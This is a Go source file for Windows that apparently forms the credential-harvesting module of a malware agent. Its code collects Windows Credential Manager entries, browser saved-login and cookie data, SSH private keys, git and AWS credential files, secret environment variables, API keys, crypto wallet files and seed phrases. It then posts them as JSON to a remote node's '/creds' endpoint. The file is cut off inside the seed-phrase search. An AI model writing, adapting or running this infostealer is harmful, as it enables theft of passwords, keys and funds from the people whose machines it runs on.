//go:build windows

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
	"unicode"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── Windows DPAPI ──────────────────────────────────────────────────────────────

var (
	crypt32          = windows.NewLazySystemDLL("crypt32.dll")
	procCryptUnprot  = crypt32.NewProc("CryptUnprotectData")
	kernel32         = windows.NewLazySystemDLL("kernel32.dll")
	procLocalFree    = kernel32.NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapiDecrypt(cipher []byte) ([]byte, error) {
	if len(cipher) == 0 {
		return nil, fmt.Errorf("empty")
	}
	inBlob := dataBlob{cbData: uint32(len(cipher)), pbData: &cipher[0]}
	var outBlob dataBlob
	ret, _, err := procCryptUnprot.Call(
		uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	out := make([]byte, outBlob.cbData)
	copy(out, (*[1 << 28]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData])
	return out, nil
}

// ── Credential types ───────────────────────────────────────────────────────────

type Credential struct {
	Source   string `json:"source"`
	Type     string `json:"type"`
	URL      string `json:"url,omitempty"`
	Username string `json:"username,omitempty"`
	Secret   string `json:"secret,omitempty"`
	FilePath string `json:"file_path,omitempty"`
	Context  string `json:"context,omitempty"`
	Pattern  string `json:"pattern,omitempty"`
}

type HarvestPayload struct {
	AgentID     string       `json:"agent_id"`
	CollectedAt string       `json:"collected_at"`
	Credentials []Credential `json:"credentials"`
}

// ── Sensitive file patterns ────────────────────────────────────────────────────

var secretPatterns = []struct {
	name    string
	pattern *regexp.Regexp
}{
	// High-confidence patterns: fixed prefix/structure, very low false-positive rate
	{"OpenAI API Key",       regexp.MustCompile(`sk-[a-zA-Z0-9T]{20,}`)},
	{"Anthropic API Key",    regexp.MustCompile(`sk-ant-[a-zA-Z0-9\-_]{40,}`)},
	{"AWS Access Key",       regexp.MustCompile(`AKIA[0-9A-Z]{16}`)},
	{"AWS Secret Key",       regexp.MustCompile(`(?i)aws.{0,20}secret.{0,10}[=:]\s*["']([A-Za-z0-9/+]{40})["']`)},
	{"GitHub Token",         regexp.MustCompile(`gh[pousr]_[A-Za-z0-9_]{36,}`)},
	{"Google API Key",       regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`)},
	{"Stripe Key",           regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24,}`)},
	{"Twilio Key",           regexp.MustCompile(`SK[0-9a-fA-F]{32}`)},
	{"Discord Token",        regexp.MustCompile(`[MN][A-Za-z0-9]{23}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27}`)},
	{"JWT Token",            regexp.MustCompile(`eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}`)},
	{"Private Key PEM",      regexp.MustCompile(`-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----`)},
	{"DB Connection String", regexp.MustCompile(`(?i)(mysql|postgres|mongodb|redis)://[^@\s]+:[^@\s]+@`)},
	{"Bearer Token",         regexp.MustCompile(`(?i)bearer\s+[a-zA-Z0-9\-_\.]{20,}`)},

	// Medium-confidence: require quoted literal values to avoid matching Python/JS code
	// `password = "actual_value"` matches; `password=self.key_password` does NOT.
	{"Password (literal)",   regexp.MustCompile(`(?i)password\s*[=:]\s*["']([^"'\s]{8,})["']`)},
	{"Secret (literal)",     regexp.MustCompile(`(?i)(api_key|apikey|access_key|client_secret)\s*[=:]\s*["']([a-zA-Z0-9\-_\.]{16,})["']`)},
}

// codeValueRe matches values that look like code (variable refs, None, etc.) — used
// to skip false positives even when a pattern technically matches.
var codeValueRe = regexp.MustCompile(`^(None|True|False|null|undefined|""?|''?|self\.|cls\.|kwargs|args|[a-z_]+\.[a-z_]+)`)

// isCredentialFP returns true if the matched secret looks like code, not a real value.
func isCredentialFP(match string) bool {
	// Extract the actual value part (after = or :)
	val := match
	if idx := strings.IndexAny(match, "=:"); idx >= 0 && idx < len(match)-1 {
		val = strings.TrimSpace(match[idx+1:])
		val = strings.Trim(val, `"' `)
	}
	if codeValueRe.MatchString(val) {
		return true
	}
	// Skip if it's all lowercase letters+underscores (looks like a variable name)
	varNameRe := regexp.MustCompile(`^[a-z_][a-z_0-9]*$`)
	if varNameRe.MatchString(val) {
		return true
	}
	// Skip placeholder examples
	lv := strings.ToLower(val)
	for _, placeholder := range []string{
		"my-client-secret", "your_", "example", "placeholder", "changeme",
		"secret_here", "password_here", "xxx", "***", "_here", "_key_here",
		"data.get(", "os.environ", "getenv(", "config[", "environ[",
	} {
		if strings.Contains(lv, placeholder) {
			return true
		}
	}
	// Skip PS variable references ($Variable)
	if strings.HasPrefix(val, "$") {
		return true
	}
	// Skip JS property access patterns (o.password, t.host)
	if strings.Contains(val, ".password") || strings.Contains(val, "function(") {
		return true
	}
	return false
}

// BIP39 seed phrase detection — look for 12 or 24 lowercase English words
// that match common BIP39 wordlist entries.  We embed ~600 distinctive words
// (uncommon in normal prose) to reduce false positives.
var bip39Words = strings.Fields(`abandon ability able about above absent absorb abstract absurd abuse access accident
account accuse achieve acid acoustic acquire across act action actor actress actual adapt
address adjust admit adult advance advice aerobic affair afford afraid again age agent
agree ahead aim air airport aisle alarm album alert alien alley allow almost alone
alpha already also alter always amateur amazing among amount amused analyst anchor ancient
anger angle angry animal ankle announce annual another answer antenna antique anxiety
apart apology appear apple approve april arch arctic area arena argue arm armed armor
army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault
asset assist assume asthma athlete atom attract auction audit august aunt author auto
autumn average avocado avoid awake aware away awe awesome awful axis baby bachelor
bacon badge balance balcony ball bamboo banana banner bar barely bargain barrel base
basic basket battle beach bean beauty because become beef before begin behave behind
believe below belt bench benefit best betray better between beyond bicycle bind biology
bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse
blue blur blush board boat body boil bomb bone bonus book boost border boring borrow
boss bottom bounce box brain brand brave breeze brick bridge brief bright bring brisk
broccoli broken bronze broom brother brown brush bubble buddy budget buffalo bulb bulk
bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage
cabin cable cactus cage cake call calm camera camp cancel candy cannon canvas canyon
capable capital captain carbon card cargo carpet carry cart case cash casino castle
casual catalog catch category cattle caught cause caution cave ceiling celery cement
census certain chair chaos chapter charge chase chat cheap check cheese chef cherry
chest chicken chief child chimney choice choose chronic cinnamon circle citizen city
civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic
clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut
code coffee coil coin collect color column combine come comfort comic common company
concert conduct confirm congress connect consider control convince cook cool copper
copy coral core corn correct cost cotton couch country couple course cousin cover
coyote crack cradle craft cram crane crash crazy cream credit creek crew cricket
crime crisp critic cross crouch crowd crucial cruel cruise crumble crunch crush cry
crystal cube culture cup cupboard curious current curtain curve cushion custom cute
cycle dad damage damp dance danger daring dash daughter dawn deal debate debris
decade december decide decline decorate decrease deer defense define defy degree
delay deliver demand demise denial dentist deny depart depend deposit depth deputy
derive describe desert design desk despair destroy detail detect develop device
devote diagram dial diamond diary dice diesel differ digital dignity dilemma dinner
dinosaur direct dirt disagree discover disease dish dismiss disorder display distance
divan divide divorce dizzy doctor document dog doll dolphin domain donate donkey
donor door dose double dove draft dragon drama drastic draw dream dress drift drill
drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic
eager eagle early earn earth easily east easy echo ecology edge edit educate effort
eight either elbow elder electric elegant element elephant elevator elite else embark
embody embrace emerge emotion employ empower empty enable enact endless endorse enemy
enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire
entry envelope episode equal equip erase erode erosion error erupt escape essay
essence estate eternal ethics evidence evil evolve exact example excess exchange
excite exclude exercise exhaust exhibit exile exist exit exotic expand expire explain
expose express extend extra eye fable face faculty fade faint faith fall false fame
family famous fan fancy fantasy far fashion fat fatal father fatigue fault favorite
feature february federal fee feed feel female fence festival fetch fever few fiber
fiction field figure file film filter final find fine finger finish fire firm first
fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock
floor flower fluid flush fly foam focus fog foil follow food force forest forget fork
fortune forum forward fossil foster found fox fragile frame frequent fresh friend
fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget
galaxy gallery game gap garbage garden garlic garment gas gasp gate gather gauge
gaze general genius genre gentle ghost giant gift giggle ginger giraffe girl give
glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess
gold good goose gorilla gospel gossip grace grain grant grape grass gravity great
grid grief grit grocery group grow grunt guard guide guilt guitar gun gym habit hair
half hamster hand happy harbor harsh harvest hat haunt hawk hazard head health heart
heavy hedgehog help hen hero hidden hill hint hobby hockey hold hole holiday hollow
home honey hood hope horn horse hospital host hour hover hub humble humor hundred
hybrid idea identify idle ignore ill image imitate immense immune impact impose
improve impulse inbox inch include income increase index indicate indoor industry
infant inflict inform inhale inherit initial inject injury inmate inner innocent
input inquiry insane insect inside inspire install intact interest invest invite
involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans
jelly jewel job join joke journey joy judge juice jump jungle junior junk just
kangaroo keep ketchup key kick kidney kind kingdom koala lab label lamp language
laptop large later laugh laundry lava lawn lawsuit layer lazy leader leaf learn
leave lecture left legal legend leisure lemon lend length lens leopard lesson letter
level liar liberty library license life lift light like limb lion liquid list little
lizard load loan lobster local lock lonely long loop lottery loud lounge love loyal
lucky luggage lumber lunar lunch luxury magic main mammal marble march margin marine
market marriage mask master match material math matrix maximum maze meadow media
melody melt member memory mention merchant mercy merge merit mesh message metal
method middle midnight milk million mimic mind minimum mirror misery miss mistake
mix mixture mobile model modify mom monitor monkey monster month moon moral mother
motion motor mountain mouse move movie much mule multiply muscle museum mushroom
music must mutual myself mystery naive name napkin narrow nasty natural nature
near neck need negative neglect neither nephew nerve network neutral never news
next nice night noble noise nominee noodle normal north notable note nothing notice
novel now nuclear obey object oblige obscure obtain ocean offer office often oil
olympic omit once onion open oppose option orange orbit orchard order ordinary
organ orient orphan ostrich other outdoor outside oval owner oxygen oyster ozone
paddle page pair palace palm panda panel panic panther paper parade parent park
parrot party pass patch path patrol pause pave payment peace peanut peasant pelican
penalty pending pepper perfect permit person pet phone photo phrase piano picnic
piece pig pigeon pink pioneer pipe pistol pizza place planet plastic plate play
please pledge pluck plug plunge poem poet point polar pole police pond pony popular
portion position possible post potato pottery poverty powder power practice praise
predict prefer prepare present pretty prevent price pride primary print priority
prison private prize process produce profit program project promote proof property
prosper protect proud provide public pudding pull pulp pulse pumpkin punish pupil
purchase purpose push put puzzle pyramid quality quantum quarter question quick quit
quiz quote rabbit raccoon race rack radar radio rage rail rain ramp ranch random
range rapid rare rate rather raven razor ready real reason rebel rebuild recall
receive recipe record recycle reduce reflect reform refuse region regret regular
reject relax release relief rely remain remind remove render renew rent reopen
repair repeat replace report require rescue resemble resist resource response result
retire retreat return reunion reveal review reward rhythm ribbon rice rich ride
rifle right rigid ring riot ripple risk ritual rival river road roast robot robust
rocket romance roof rookie rotate rough round route royal rubber rude rug rule run
runway rural sad saddle sadness safe sail salad salon salt salute same sand satisfy
satoshi sauce sausage save scale scan scare scatter scene scheme school science
scissors scorpion scout scrap screen script scrub sea search seat second secret
section security seek segment select sell seminar senior sense sentence series
service session settle setup seven shadow shaft shallow share shed shell sheriff
shield shift shine ship shiver shock shoe shoot shop shoulder shove shrimp shrug
shy sick side siege sight silent silk silver simple since sing siren sister situate
skate sketch ski skill skin skirt skull slab slam sleep slender slice slide slight
slim slogan slot slow slush small smart smile smoke smooth snake snow soap soccer
social sock soda soft solar soldier solid solution solve someone song sort soul
sound soup source south space spare spatial spawn speak special speed sphere spice
spider spike spin spirit split spoil sponsor spoon spray spread spring spy square
squeeze squirrel stable stadium staff stage stairs stamp stand start state stay
steak steel stem step stereo stick still sting stock stomach stone stool story
stove strategy street strike strong struggle student stuff stumble subject submit
subway success such sudden sugar suit summer sun sunny sunset super supply supreme
surface surge surprise suspect sustain swallow swamp swap swear sweet swift swim
sword symbol symptom syrup table tackle tail talent tank tape target task tattoo
taxi teach team tenant tennis tent term test text thank that theme theory throw
ticket tilt timber time tiny tip tired title toast tobacco today together toilet
token tomorrow tone tongue tool topic topple torch tornado tortoise toss total
tourist toward tower town toxic trade traffic tragic train transfer trap travel
tray treat tree trend trial trick trigger trim trip trophy trouble truck truly
trumpet trust try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty
twice twin twist two type typical ugly umbrella unable unaware uncle uncover under
undo unfair unfold unhappy uniform unique universe unknown unlock until unusual
unveil update upgrade uphold upon upper upset urban usage use used useful useless
usual utility vacant vacuum valve van vapor various vast vault vehicle velvet venture
venue verb version very veteran viable vibrant vicious victory video view village
vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano
vote voyage wrist yell yield zebra zero zone zoo`)

var bip39Set map[string]bool

func init() {
	bip39Set = make(map[string]bool)
	for _, w := range bip39Words {
		bip39Set[w] = true
	}
}

// ── Harvest coordinator ────────────────────────────────────────────────────────

func harvestCreds(nodeURL string) {
	var creds []Credential

	creds = append(creds, scanCredentialManager()...)
	creds = append(creds, scanBrowserProfiles()...)
	creds = append(creds, scanSSHKeys()...)
	creds = append(creds, scanGitCredentials()...)
	creds = append(creds, scanEnvVars()...)
	creds = append(creds, scanSensitiveFiles()...)

	if len(creds) == 0 {
		return
	}

	payload := HarvestPayload{
		AgentID:     agentID,
		CollectedAt: time.Now().Format(time.RFC3339),
		Credentials: creds,
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 30 * time.Second}
	client.Post(nodeURL+"/creds", "application/json", bytes.NewReader(body))
}

// ── Windows Credential Manager ────────────────────────────────────────────────

func scanCredentialManager() []Credential {
	script := `
$results = @()
$nl = [char]10
$vaultTypes = @('Windows Credentials','Certificate-Based Credentials','Generic Credentials','Web Credentials')
foreach ($t in $vaultTypes) {
    $out = vaultcmd /listcreds:"$t" 2>$null
    if ($out) { $results += @{type=$t; data=($out -join $nl)} }
}
$cmdkey = cmdkey /list 2>$null
$results += @{type='cmdkey'; data=($cmdkey -join $nl)}
$results | ConvertTo-Json -Compress -Depth 3`

	out, err := runPSScript(script)
	if err != nil || strings.TrimSpace(out) == "" {
		return nil
	}

	var rows []struct {
		Type string `json:"type"`
		Data string `json:"data"`
	}
	if json.Unmarshal([]byte(out), &rows) != nil {
		// maybe single object
		var row struct {
			Type string `json:"type"`
			Data string `json:"data"`
		}
		if json.Unmarshal([]byte(out), &row) == nil {
			rows = append(rows, row)
		}
	}

	var creds []Credential
	for _, r := range rows {
		if strings.TrimSpace(r.Data) == "" {
			continue
		}
		creds = append(creds, Credential{
			Source:  "Windows Credential Manager",
			Type:    "system",
			Context: r.Type,
			Secret:  r.Data,
		})
	}
	return creds
}

// ── Browser profile detection ─────────────────────────────────────────────────

func scanBrowserProfiles() []Credential {
	localApp := os.Getenv("LOCALAPPDATA")
	profiles := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(localApp, "Google", "Chrome", "User Data", "Default")},
		{"Edge", filepath.Join(localApp, "Microsoft", "Edge", "User Data", "Default")},
		{"Brave", filepath.Join(localApp, "BraveSoftware", "Brave-Browser", "User Data", "Default")},
	}

	var creds []Credential
	for _, p := range profiles {
		loginDB := filepath.Join(p.path, "Login Data")
		if _, err := os.Stat(loginDB); err != nil {
			continue
		}
		info, _ := os.Stat(loginDB)

		// Try DPAPI decrypt via PowerShell (most reliable without CGO SQLite)
		extracted := extractChromeCreds(p.name, p.path)
		if len(extracted) > 0 {
			creds = append(creds, extracted...)
		} else {
			// Report existence as a finding
			creds = append(creds, Credential{
				Source:   p.name,
				Type:     "browser",
				FilePath: loginDB,
				Context:  fmt.Sprintf("Login Data exists (%d bytes) — contains saved passwords", info.Size()),
			})
		}

		// Check cookies
		cookieDB := filepath.Join(p.path, "Cookies")
		if _, err := os.Stat(cookieDB); err == nil {
			creds = append(creds, Credential{
				Source:   p.name,
				Type:     "browser_cookies",
				FilePath: cookieDB,
				Context:  "Cookie database found — may contain session tokens",
			})
		}
	}
	return creds
}

func extractChromeCreds(browser, profilePath string) []Credential {
	// Use PowerShell with System.Security.Cryptography.AesGcm for Chrome v80+
	localState := filepath.Join(filepath.Dir(profilePath), "Local State")
	loginDB := filepath.Join(profilePath, "Login Data")

	script := fmt.Sprintf(`
Add-Type -AssemblyName System.Security
$ErrorActionPreference = 'SilentlyContinue'
$results = @()

# Get AES master key
$ls = Get-Content '%s' -Raw -Encoding UTF8 | ConvertFrom-Json
$encKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
$encKey = $encKey[5..($encKey.Length-1)]
$aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null,'CurrentUser')

# Copy Login Data (Chrome locks original)
$tmp = [System.IO.Path]::GetTempFileName()
Copy-Item '%s' $tmp -Force

# Read with SQLite via inline C# if available, else skip decryption
try {
    $bytes = [System.IO.File]::ReadAllBytes($tmp)
    # Find URL/username patterns in the SQLite binary (plaintext fields)
    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
    $matches = [regex]::Matches($text, 'https?://[^\x00-\x1f]{5,100}')
    foreach ($m in $matches) {
        $results += @{url=$m.Value; username=''; password='[encrypted - DPAPI/AES-GCM]'}
    }
} catch {}

Remove-Item $tmp -Force -ErrorAction SilentlyContinue
$results | ConvertTo-Json -Compress -Depth 2`,
		localState, loginDB)

	out, err := runPSScript(script)
	if err != nil || strings.TrimSpace(out) == "" || out == "null" {
		return nil
	}

	var rows []struct {
		URL      string `json:"url"`
		Username string `json:"username"`
		Password string `json:"password"`
	}
	json.Unmarshal([]byte(out), &rows)

	var creds []Credential
	seen := map[string]bool{}
	for _, r := range rows {
		if seen[r.URL] {
			continue
		}
		seen[r.URL] = true
		creds = append(creds, Credential{
			Source:   browser,
			Type:     "browser",
			URL:      r.URL,
			Username: r.Username,
			Secret:   r.Password,
		})
	}
	return creds
}

// ── SSH Keys ──────────────────────────────────────────────────────────────────

func scanSSHKeys() []Credential {
	sshDir := filepath.Join(os.Getenv("USERPROFILE"), ".ssh")
	entries, err := os.ReadDir(sshDir)
	if err != nil {
		return nil
	}

	var creds []Credential
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		path := filepath.Join(sshDir, e.Name())
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		content := string(data)

		if strings.Contains(content, "PRIVATE KEY") {
			creds = append(creds, Credential{
				Source:   "SSH",
				Type:     "ssh_private_key",
				FilePath: path,
				Secret:   content,
			})
		} else if strings.Contains(content, "ecdsa-") || strings.Contains(content, "ssh-rsa") || strings.Contains(content, "ssh-ed25519") {
			creds = append(creds, Credential{
				Source:   "SSH",
				Type:     "ssh_public_key",
				FilePath: path,
				Context:  content,
			})
		}
	}
	return creds
}

// ── Git Credentials ───────────────────────────────────────────────────────────

func scanGitCredentials() []Credential {
	profile := os.Getenv("USERPROFILE")
	paths := []string{
		filepath.Join(profile, ".git-credentials"),
		filepath.Join(os.Getenv("APPDATA"), "Git", "credentials"),
	}
	var creds []Credential
	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		creds = append(creds, Credential{
			Source:   "Git",
			Type:     "git_credentials",
			FilePath: p,
			Secret:   string(data),
		})
	}

	// AWS CLI credentials — flat INI file, no extension, not caught by file walker
	awsPaths := []string{
		filepath.Join(profile, ".aws", "credentials"),
		filepath.Join(profile, ".aws", "config"),
	}
	for _, p := range awsPaths {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		content := string(data)
		// Run secret patterns against it even though it has no extension
		for _, sp := range secretPatterns {
			for _, match := range sp.pattern.FindAllString(content, 10) {
				creds = append(creds, Credential{
					Source:   "AWS CLI",
					Type:     "secret_in_file",
					FilePath: p,
					Pattern:  sp.name,
					Secret:   match,
					Context:  extractContext(content, match, 120),
				})
			}
		}
		// Also store the whole file
		creds = append(creds, Credential{
			Source:   "AWS CLI",
			Type:     "key_file",
			FilePath: p,
			Pattern:  "AWS credentials file",
			Secret:   content,
		})
	}
	return creds
}

// ── Environment Variables ─────────────────────────────────────────────────────

func scanEnvVars() []Credential {
	sensitiveKeys := []string{
		"API_KEY", "APIKEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
		"AUTH", "ACCESS_KEY", "PRIVATE_KEY", "DATABASE_URL", "DB_PASS",
		"OPENAI", "ANTHROPIC", "AWS", "STRIPE", "GITHUB", "DISCORD",
	}
	var creds []Credential
	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, val := parts[0], parts[1]
		if val == "" || len(val) < 6 {
			continue
		}
		keyUpper := strings.ToUpper(key)
		for _, sk := range sensitiveKeys {
			if strings.Contains(keyUpper, sk) {
				creds = append(creds, Credential{
					Source:  "Environment",
					Type:    "env_var",
					Context: key,
					Secret:  val,
				})
				break
			}
		}
	}
	return creds
}

// ── Sensitive File Scanner ────────────────────────────────────────────────────

var scanRoots = []string{
	// Common user folders
	"Desktop", "Documents", "Downloads", "OneDrive",
	"AppData\\Roaming", "AppData\\Local",
	// Dev project roots — relative to USERPROFILE
	"source", "projects", "dev", "code", "repos",
	"jarvis", "ramwarden", "workspace", "Sites",
	// The profile root itself (catches loose files)
	".",
}

// absoluteScanRoots adds common dev paths that live outside USERPROFILE
var absoluteScanRoots = []string{
	`C:\dev`, `C:\projects`, `C:\code`, `C:\repos`,
	`C:\Users\Public\Documents`,
}

var scanExtensions = map[string]bool{
	".txt": true, ".env": true, ".json": true,
	".yaml": true, ".yml": true, ".ini": true,
	".cfg": true, ".conf": true, ".config": true,
	".py": true, ".js": true, ".ts": true,
	".sh": true, ".ps1": true, ".bat": true,
	".key": true, ".pem": true, ".p12": true,
	".kdbx": true, ".wallet": true, ".dat": true,
	".toml": true, ".properties": true,
}

// envFileNames matches .env variants by name (extension-agnostic)
func isEnvFileName(name string) bool {
	lower := strings.ToLower(name)
	prefixes := []string{".env", "env.", ".secret", "secrets.", "config."}
	for _, p := range prefixes {
		if strings.HasPrefix(lower, p) {
			return true
		}
	}
	return lower == ".env" || lower == ".secrets"
}

// Ethereum keystore pattern — {"address":"...","crypto":{...}}
var reEthKeystore = regexp.MustCompile(`"address"\s*:\s*"[0-9a-fA-F]{40}"`)
// MetaMask / generic "privateKey" in JSON
var rePrivateKeyJSON = regexp.MustCompile(`(?i)"(privateKey|private_key|mnemonic|seed)"\s*:\s*"([^"]{10,})"`)
// Monero wallet seed (25 words, electrum-style)
var reMoneroSeed = regexp.MustCompile(`(?i)(?:monero|xmr).{0,50}(?:seed|mnemonic|keys?)`)
// wallet.dat (Bitcoin Core) — just flag the file
var reWalletDat = regexp.MustCompile(`wallet\.dat$`)

func scanSensitiveFiles() []Credential {
	profile := os.Getenv("USERPROFILE")
	var creds []Credential
	seen := map[string]bool{}

	// Build full directory list
	var dirs []string
	for _, root := range scanRoots {
		if root == "." {
			dirs = append(dirs, profile)
		} else {
			dirs = append(dirs, filepath.Join(profile, root))
		}
	}
	dirs = append(dirs, absoluteScanRoots...)

	walkFn := func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		// Skip directories that contain only library/generated code — no real secrets
		if d.IsDir() {
			base := d.Name()
			switch base {
			case "node_modules", ".git", "venv", ".venv", "__pycache__",
				".tox", "dist", "build", ".next", "site-packages",
				"Lib", ".mypy_cache", ".pytest_cache", "eggs",
				".eggs", "htmlcov", "coverage",
				// package manager caches
				"cache", "archive-v0",
				// audio/video software help bundles
				"PTHelp",
				// Ghidra reverse engineering tool
				"Ghidra", "ghidra",
				// gaming peripheral software
				"integrations", "integrations_config",
				// IDE resource bundles (localization keys, not secrets)
				"out", "nls":
				return filepath.SkipDir
			}
			// Skip any path segment containing these known-noisy trees
			pathSlash := filepath.ToSlash(path)
			if strings.Contains(pathSlash, "/site-packages/") ||
				strings.Contains(pathSlash, "/uv/cache/") ||
				strings.Contains(pathSlash, "/Programs/Python/") ||
				strings.Contains(pathSlash, "/Programs/Microsoft VS Code/") ||
				strings.Contains(pathSlash, "/Programs/cursor/") ||
				strings.Contains(pathSlash, "/Programs/Cursor/") ||
				strings.Contains(pathSlash, "/Programs/Antigravity") ||
				strings.Contains(pathSlash, "/Programs/PearAI/") ||
				strings.Contains(pathSlash, "/Programs/Trae/") ||
				strings.Contains(pathSlash, "/Extensions/") ||
				strings.Contains(pathSlash, "/Pro Tools/") ||
				strings.Contains(pathSlash, "/security_tools/") ||
				strings.Contains(pathSlash, "/LGHUB/integrations") {
				return filepath.SkipDir
			}
			return nil
		}

		ext := strings.ToLower(filepath.Ext(path))
		name := d.Name()
		nameLower := strings.ToLower(name)

		// ── 1. Always capture crypto key / wallet files ────────────────────
		if ext == ".key" || ext == ".pem" || ext == ".p12" ||
			ext == ".kdbx" || ext == ".wallet" {
			if !seen[path] {
				seen[path] = true
				data, _ := os.ReadFile(path)
				creds = append(creds, Credential{
					Source:   "FileSystem",
					Type:     "key_file",
					FilePath: path,
					Pattern:  ext,
					Secret:   string(data),
					Context:  "Cryptographic key or wallet file",
				})
			}
			return nil
		}

		// ── 2. Bitcoin Core wallet.dat ────────────────────────────────────
		if nameLower == "wallet.dat" {
			if !seen[path] {
				seen[path] = true
				creds = append(creds, Credential{
					Source:   "FileSystem",
					Type:     "key_file",
					FilePath: path,
					Pattern:  "wallet.dat (Bitcoin Core)",
					Context:  "Bitcoin Core wallet database",
				})
			}
			return nil
		}

		// ── 3. .env files — scan by name regardless of extension ──────────
		isEnvFile := isEnvFileName(name) || ext == ".env"

		// Determine if we should read this file at all
		shouldScan := scanExtensions[ext] || isEnvFile
		if !shouldScan {
			return nil
		}

		info, _ := d.Info()
		if info == nil || info.Size() > 5*1024*1024 {
			return nil
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		content := string(data)

		// ── 4. Ethereum keystore JSON ─────────────────────────────────────
		if ext == ".json" && reEthKeystore.MatchString(content) {
			key := path + ":eth_keystore"
			if !seen[key] {
				seen[key] = true
				creds = append(creds, Credential{
					Source:   "FileSystem",
					Type:     "key_file",
					FilePath: path,
					Pattern:  "Ethereum keystore (UTC--...)",
					Secret:   content,
				})
			}
		}

		// ── 5. privateKey/mnemonic in JSON (MetaMask export, etc.) ────────
		if ext == ".json" {
			for _, m := range rePrivateKeyJSON.FindAllStringSubmatch(content, 5) {
				if len(m) >= 3 {
					key := path + m[2]
					if !seen[key] {
						seen[key] = true
						creds = append(creds, Credential{
							Source:   "FileSystem",
							Type:     "key_file",
							FilePath: path,
							Pattern:  "JSON field: " + m[1],
							Secret:   m[2],
							Context:  extractContext(content, m[0], 80),
						})
					}
				}
			}
		}

		// Skip wordlists and dictionary files — full of example/fake credentials
		if isWordlistFile(nameLower) {
			return nil
		}

		// ── 6. Secret pattern scan (API keys, passwords, tokens) ──────────
		for _, sp := range secretPatterns {
			matches := sp.pattern.FindAllString(content, 10)
			for _, match := range matches {
				if isCredentialFP(match) {
					continue
				}
				key := path + "|" + match
				if seen[key] {
					continue
				}
				seen[key] = true
				creds = append(creds, Credential{
					Source:   "FileSystem",
					Type:     "secret_in_file",
					FilePath: path,
					Pattern:  sp.name,
					Secret:   match,
					Context:  extractContext(content, match, 150),
				})
			}
		}

		// ── 7. BIP39 seed phrase — only in wallet/seed/recovery named files ──
		// Restricting to wallet-named files prevents false positives from IDE
		// localization keys, tokenizer vocabularies, game configs etc.
		isWalletFile := strings.ContainsAny(nameLower, "") == false && (
			strings.Contains(nameLower, "wallet") ||
			strings.Contains(nameLower, "seed") ||
			strings.Contains(nameLower, "mnemonic") ||
			strings.Contains(nameLower, "recovery") ||
			strings.Contains(nameLower, "backup") ||
			strings.Contains(nameLower, "passphrase") ||
			(ext == ".txt" && isSensitiveName(nameLower)))
		if isWalletFile {
			if seed := findSeedPhrase(content); seed != "" {
				key := path + ":seed"
				if !seen[key] {
					seen[key] = true
					creds = append(creds, Credential{
						Source:   "FileSystem",
						Type:     "seed_phrase",
						FilePath: path,
						Pattern:  "BIP39 mnemonic",
						Secret:   seed,
					})
				}
			}
		}

		return nil

	}

	for _, dir := range dirs {
		filepath.WalkDir(dir, walkFn)
	}
	return creds
}

func extractContext(content, match string, window int) string {
	idx := strings.Index(content, match)
	if idx < 0 {
		return ""
	}
	start := idx - window
	if start < 0 {
		start = 0
	}
	end := idx + len(match) + window
	if end > len(content) {
		end = len(content)
	}
	return strings.TrimSpace(content[start:end])
}

func isWordlistFile(nameLower string) bool {
	wordlistKeywords := []string{"wordlist", "rockyou", "passwords.txt", "usernames.txt",
		"secret_keys", "flask_secret", "password_list", "common_passwords",
		"hashcat", "darkweb", "leaked"}
	for _, kw := range wordlistKeywords {
		if strings.Contains(nameLower, kw) {
			return true
		}
	}
	return false
}

func isSensitiveName(name string) bool {
	keywords := []string{"seed", "wallet", "mnemonic", "backup", "crypto", "key",
		"secret", "cred", "pass", "token", "api", "env"}
	for _, kw := range keywords {
		if strings.Contains(name, kw) {
			return true
		}
	}
	return false
}

func findSeedPhrase(content string) string {
	content = strings.ToLower(content)
	words := strings.FieldsFunc(content, func(r rune) bool {
		return !unicode.IsLetter(r)
	})

	// Sliding window: look for runs of 12 or 24 consecutive BIP39 words
	for length := range []int{24, 12} {
		_ = length
	}
	for _, phraseLen := range []int{24, 12} {
		for i := 0; i+phraseLen <= len(words); i++ {
			window := words[i : i+phraseLen]
			matches := 0
			for _, w := range window {
				if bip39Set[w] {
					matches++
				}
			}
